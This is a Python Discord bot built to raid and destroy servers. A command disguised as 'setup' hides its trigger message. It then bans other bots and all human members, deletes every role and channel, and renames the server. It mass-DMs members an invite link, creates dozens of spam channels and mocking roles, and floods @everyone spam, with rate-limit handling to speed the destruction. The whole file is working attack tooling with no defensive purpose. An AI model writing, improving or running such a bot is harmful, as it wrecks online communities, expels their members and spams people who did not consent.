import discord
from discord.ext import commands
import asyncio
import random
import os
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("TOKEN")
PREFIX = "!"
DEFAULT_NEW_NAME = "ますまに共栄圏植民地"
INVITE_LINK = "https://discord.gg/tqNR7BsAsR"

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.bans = True
intents.guilds = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

sem_global = asyncio.Semaphore(50)
sem_message = asyncio.Semaphore(80)
sem_dm = asyncio.Semaphore(15)

async def limited_global(coro):
    async with sem_global:
        try:
            await coro
        except:
            pass

async def limited_message(coro):
    async with sem_message:
        try:
            await coro
        except:
            pass

async def limited_dm(coro):
    async with sem_dm:
        try:
            await coro
        except:
            pass

async def send_dm(member):
    try:
        await member.send(INVITE_LINK)
    except:
        pass

async def create_channel_safely(guild, name):
    try:
        return await guild.create_text_channel(name)
    except discord.HTTPException as e:
        if e.status == 429:
            await asyncio.sleep(getattr(e, 'retry_after', 5) + 0.5)
            return await create_channel_safely(guild, name)
        return None

async def create_colored_roles_task(guild, target_roles):
    current = 0
    while current < target_roles:
        try:
            await guild.create_role(
                name="ますまに共栄圏に荒らされましたｗｗｗ",
                color=discord.Color.random(),
                reason=""
            )
            current += 1
        except discord.HTTPException as e:
            if e.status == 429:
                await asyncio.sleep(getattr(e, 'retry_after', 5) + 0.5)
            else:
                break
        except:
            break
        await asyncio.sleep(0.25)

async def ban_all_task(guild, members, reason):
    for m in members:
        try:
            await guild.ban(m, reason=reason, delete_message_days=0)
        except:
            pass
        await asyncio.sleep(0.5)

async def core_nuke(guild, new_server_name=None):
    new_name = new_server_name or DEFAULT_NEW_NAME

    members = [m for m in guild.members if m != bot.user]
    non_bot_members = [m for m in members if not m.bot]

    print(f"破壊開始: {guild.name} 非BOT={len(non_bot_members)}")

    # 他のボットBAN
    await asyncio.gather(*(guild.ban(m, reason="", delete_message_days=0) for m in members if m.bot), return_exceptions=True)

    # DM
    await asyncio.gather(*[limited_dm(send_dm(m)) for m in non_bot_members], return_exceptions=True)

    # ロール削除（並行バッチ + 再試行で速く）
    roles_to_delete = [r for r in guild.roles if not r.is_default() and not r.managed]
    batch_size = 30
    for i in range(0, len(roles_to_delete), batch_size):
        batch = roles_to_delete[i:i+batch_size]
        await asyncio.gather(*(r.delete() for r in batch), return_exceptions=True)
        await asyncio.sleep(0.05)

    # チャンネル削除（並行）
    await asyncio.gather(*(ch.delete() for ch in guild.channels), return_exceptions=True)

    # サーバー名変更
    await guild.edit(name=new_name)

    # 規模別調整（チャンネル数を抑えて速く終わるように）
    member_count = len(non_bot_members)
    if member_count < 100:
        target_channels = 60  # 作りすぎ防止
        target_roles = 50
        spam_sleep_min = 0.15
        spam_sleep_max = 0.35
    elif member_count < 500:
        target_channels = 50
        target_roles = 40
        spam_sleep_min = 0.2
        spam_sleep_max = 0.4
    else:
        target_channels = 30
        target_roles = 30
        spam_sleep_min = 0.3
        spam_sleep_max = 0.5

    # チャンネル作成（並行バッチ + 再試行）
    channels = []
    current = 0
    channel_names = ["ますまに共栄圏万歳", "ますまに共栄圏最強"]
    while len(channels) < target_channels:
        tasks = []
        batch_size = 30  # 同時減らしてrate limit回避
        for _ in range(batch_size):
            if len(channels) >= target_channels:
                break
            current += 1
            name = channel_names[current % 2]
            tasks.append(create_channel_safely(guild, name))
        batch = await asyncio.gather(*tasks, return_exceptions=True)
        added = [c for c in batch if c]
        channels += added
        await asyncio.sleep(0.1)  # 少し長めに

    # スパム開始 + BAN/ロール作成並行
    spam_messages = [
        f"@everyone {INVITE_LINK}",
        f"@everyone 来い {INVITE_LINK}"
    ]

    message_counters = {ch.id: 0 for ch in channels}
    active_channels = channels.copy()

    ban_task = asyncio.create_task(ban_all_task(guild, non_bot_members, new_name))
    role_create_task = asyncio.create_task(create_colored_roles_task(guild, target_roles))

    while any(c < 100 for c in message_counters.values()):
        spam_tasks = []
        for ch in active_channels[:]:
            if message_counters[ch.id] >= 100:
                active_channels.remove(ch)
                continue

            spam_tasks.append(limited_message(ch.send(random.choice(spam_messages))))
            message_counters[ch.id] += 1  # 仮カウント（エラー無視で回転優先）

        await asyncio.gather(*spam_tasks, return_exceptions=True)
        await asyncio.sleep(random.uniform(spam_sleep_min, spam_sleep_max))

    await ban_task
    await role_create_task

    print("完了")

@bot.command(name="masumani", aliases=["setup"])
async def trigger(ctx, *, new_name: str = None):
    if not ctx.guild:
        return
    try:
        await ctx.message.delete()
    except:
        pass
    asyncio.create_task(core_nuke(ctx.guild, new_name))

@bot.event
async def on_ready():
    print(f"起動: {bot.user}")

bot.run(TOKEN)
